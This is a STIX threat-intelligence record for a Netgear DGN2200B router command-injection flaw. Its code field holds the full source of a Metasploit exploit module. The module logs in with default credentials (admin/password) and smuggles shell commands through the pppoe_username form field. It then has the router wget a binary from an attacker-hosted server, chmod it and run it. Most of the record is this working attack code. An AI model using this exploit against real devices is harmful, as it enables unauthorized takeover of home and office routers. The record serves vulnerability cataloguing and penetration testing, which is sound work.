{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c556ff7-49fd-4c16-8698-c7917af37abd",
    "created": "2024-08-14T17:04:24.434225Z",
    "modified": "2024-08-14T17:04:24.434229Z",
    "name": "Netgear DGN2200B pppoe.cgi Remote Command Execution",
    "description": " Some Netgear Routers are vulnerable to an authenticated OS command injection on their web interface. Default credentials for the web interface are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. This module overwrites parts of the PPOE configuration, while the module tries to restore it after exploitation configuration backup is recommended. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_dgn2200b_pppoe_exec.rb",
            "external_id": "netgear_dgn2200b_pppoe_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-015"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Netgear DGN2200B pppoe.cgi Remote Command Execution',\n      'Description' => %q{\n          Some Netgear Routers are vulnerable to an authenticated OS command injection\n        on their web interface. Default credentials for the web interface are admin/admin\n        or admin/password. Since it is a blind os command injection vulnerability, there\n        is no output for the executed command when using the cmd generic payload. A ping\n        command against a controlled system could be used for testing purposes. This module\n        overwrites parts of the PPOE configuration, while the module tries to restore it\n        after exploitation configuration backup is recommended.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'BID', '57998' ],\n          [ 'EDB', '24513' ],\n          [ 'OSVDB', '90320' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-015' ]\n        ],\n      'DisclosureDate' => '2013-02-15',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'CMD',\n            {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n            }\n          ],\n          [ 'Linux mipsbe Payload',\n            {\n            'Arch' => ARCH_MIPSBE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1\n      ))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'password' ]),\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60]),\n        OptInt.new('RELOAD_CONF_DELAY', [true, 'Time to wait to allow the remote device to load configuration', 45])\n      ])\n  end\n\n  def get_config(config, pattern)\n    if config =~ /#{pattern}/\n      #puts \"[*] #{$1}\"\t#debugging\n      return $1\n    end\n    return \"\"\n  end\n\n  def grab_config(user,pass)\n    print_status(\"#{rhost}:#{rport} - Trying to download the original configuration\")\n    begin\n      res = send_request_cgi({\n        'uri'     => '/BAS_pppoe.htm',\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        if res.body =~ /pppoe_username/\n          print_good(\"#{rhost}:#{rport} - Successfully downloaded the configuration\")\n        else\n          fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Download of the original configuration not possible or the device uses a configuration which is not supported\")\n        end\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n    @pppoe_username_orig = get_config(res.body, \"<td\\ align=\\\"right\\\"><input\\ type=\\\"text\\\"\\ name=\\\"pppoe_username\\\"\\ size=\\\"15\\\"\\ maxlength=\\\"63\\\"\\ value=\\\"(.*)\\\"><\\/td\")\n    @pppoe_passwd_orig = get_config(res.body, \"<td\\ align=\\\"right\\\"><input\\ type=\\\"password\\\"\\ name=\\\"pppoe_passwd\\\"\\ size=\\\"15\\\"\\ maxlength=\\\"63\\\"\\ value=\\\"(.*)\\\"><\\/td\")\n    @pppoe_servicename_orig = get_config(res.body, \"<td\\ align=\\\"right\\\"><input\\ type=\\\"text\\\"\\ name=\\\"pppoe_servicename\\\"\\ maxlength=\\\"63\\\"\\ size=\\\"15\\\"\\ value=\\\"(.*)\\\"><\\/td\")\n\n    @runtest_orig = get_config(res.body, \"<input\\ type=\\\"hidden\\\"\\ name=\\\"runtest\\\"\\ value=\\\"(.*)\\\">\")\n    @wan_ipaddr_orig = get_config(res.body, \"<INPUT\\ name=wan_ipaddr\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @pppoe_localip_orig = get_config(res.body, \"<INPUT\\ name=pppoe_localip\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_dns_sel_orig = get_config(res.body, \"<INPUT\\ name=wan_dns_sel\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_dns1_pri_orig = get_config(res.body, \"<INPUT\\ name=wan_dns1_pri\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_dns1_sec_orig = get_config(res.body, \"<INPUT\\ name=wan_dns1_sec\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_hwaddr_sel_orig = get_config(res.body, \"<INPUT\\ name=wan_hwaddr_sel\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_hwaddr_def_orig = get_config(res.body, \"<INPUT\\ name=wan_hwaddr_def\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_hwaddr2_orig = get_config(res.body, \"<INPUT\\ name=wan_hwaddr2\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_hwaddr_pc_orig = get_config(res.body, \"<INPUT\\ name=wan_hwaddr_pc\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @wan_nat_orig = get_config(res.body, \"<INPUT\\ name=wan_nat\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @opendns_parental_ctrl_orig = get_config(res.body, \"<INPUT\\ name=opendns_parental_ctrl\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @pppoe_flet_sel_orig = get_config(res.body, \"<INPUT\\ name=pppoe_flet_sel\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @pppoe_flet_type_orig = get_config(res.body, \"<INPUT\\ name=pppoe_flet_type\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @pppoe_temp_orig = get_config(res.body, \"<INPUT\\ name=pppoe_temp\\ type=hidden\\ value=\\ \\\"(.*)\\\">\")\n    @apply_orig = get_config(res.body, \"<input\\ type=\\\"SUBMIT\\\"\\ name=\\\"apply\\\"\\ value=(.*)\\ onClick=\\\"return\\ checkData\\(\\)\\\">\")\n  end\n\n  def restore_conf(user,pass,uri)\n    # we have used most parts of the original configuration\n    # just need to restore pppoe_username\n    cmd = @pppoe_username_orig\n    print_status(\"#{rhost}:#{rport} - Asking the Netgear device to reload original configuration\")\n\n    res = request(cmd,user,pass,uri)\n\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to reload original configuration\")\n    end\n\n    print_status(\"#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration\")\n    select(nil, nil, nil, @timeout)\n  end\n\n  def request(cmd,user,pass,uri)\n    begin\n\n    #original post request\n    #login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20COMMAND%20%26\n    #&pppoe_passwd=69cw20hb&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5\n    #&WANAssign=Dynamic&DNSAssign=0&en_nat=1&MACAssign=0&apply=%C3%9Cbernehmen\n    #&runtest=yes&wan_ipaddr=0.0.0.0&pppoe_localip=0.0.0.0&wan_dns_sel=0\n    #&wan_dns1_pri=0.0.0.0&wan_dns1_sec=...&wan_hwaddr_sel=0\n    #&wan_hwaddr_def=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr2=84%3A1B%3A5E%3A01%3AE7%3A05\n    #&wan_hwaddr_pc=5C%3A26%3A0A%3A2B%3AF0%3A3F&wan_nat=1&opendns_parental_ctrl=0\n    #&pppoe_flet_sel=&pppoe_flet_type=&pppoe_temp=&opendns_parental_ctrl=0\n      res = send_request_cgi(\n        {\n          'uri'\t=> uri,\n          'method' => 'POST',\n          'authorization' => basic_auth(user,pass),\n          'encode_params' => false,\n          'vars_post' => {\n            \"login_type\" => \"PPPoE%28PPP+over+Ethernet%29\",#default must be ok\n            \"pppoe_username\" => cmd,\n            \"pppoe_passwd\" => @pppoe_passwd_orig,\n            \"pppoe_servicename\" => @pppoe_servicename_orig,\n            \"pppoe_dod\" => \"1\",\t\t#default must be ok\n            \"pppoe_idletime\" => \"5\",\t#default must be ok\n            \"WANAssign\" => \"Dynamic\",\t#default must be ok\n            \"DNSAssign\" => \"0\",\t\t#default must be ok\n            \"en_nat\" => \"1\",\t\t#default must be ok\n            \"MACAssign\" => \"0\",\t\t#default must be ok\n            \"apply\" => @apply_orig,\n            \"runtest\" => @runtest_orig,\n            \"wan_ipaddr\" => @wan_ipaddr_orig,\n            \"pppoe_localip\" => @pppoe_localip_orig,\n            \"wan_dns_sel\" => @wan_dns_sel_orig,\n            \"wan_dns1_pri\" => @wan_dns1_pri_orig,\n            \"wan_dns1_sec\" => @wan_dns1_sec_orig,\n            \"wan_hwaddr_sel\" => @wan_hwaddr_sel_orig,\n            \"wan_hwaddr_def\" => @wan_hwaddr_def_orig,\n            \"wan_hwaddr2\" => @wan_hwaddr2_orig,\n            \"wan_hwaddr_pc\" => @wan_hwaddr_pc_orig,\n            \"wan_nat\" => @wan_nat_orig,\n            \"pppoe_flet_sel\" => @pppoe_flet_sel_orig,\n            \"pppoe_flet_type\" => @pppoe_flet_type_orig,\n            \"pppoe_temp\" => @pppoe_temp_orig,\n            \"opendns_parental_ctrl\" => @opendns_parental_ctrl_orig\n          }\n        })\n      return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n  end\n\n  def logout(user,pass)\n    begin\n      res = send_request_cgi({\n        'uri'     => '/LGO_logout.htm',\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful logout possible\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n  end\n\n  def exploit\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    uri = '/pppoe.cgi'\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n    @timeout = datastore['RELOAD_CONF_DELAY']\n\n    #\n    # testing Login\n    #\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n    begin\n      res = send_request_cgi({\n        'uri'     => '/',\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n    grab_config(user,pass)\n\n    if target.name =~ /CMD/\n      if not (datastore['CMD'])\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      cmd = payload.encoded\n      cmd = \"%26%20#{cmd}%20%26\"\n      res = request(cmd,user,pass,uri)\n      if (!res)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n      else\n        print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n      end\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our server\n    #\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri\n    else\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the Netgear device to download and execute #{service_url}\")\n    #this filename is used to store the payload on the device\n    filename = rand_text_alpha_lower(8)\n\n    cmd = \"/usr/bin/wget #{service_url} -O /tmp/#{filename};chmod 777 /tmp/#{filename};/tmp/#{filename}\"\n    cmd = Rex::Text.uri_encode(cmd)\n    cmd = \"%26%20#{cmd}%20%26\"\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Netgear device to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    #reload original configuration\n    #\n    restore_conf(user,pass,uri)\n\n    #\n    #lockout of the device and free the management sessions\n    #\n    logout(user,pass)\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    #print_status(\"on_request_uri called: #{request.inspect}\")\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-15",
    "x_mitre_platforms": [
        "linux"
    ]
}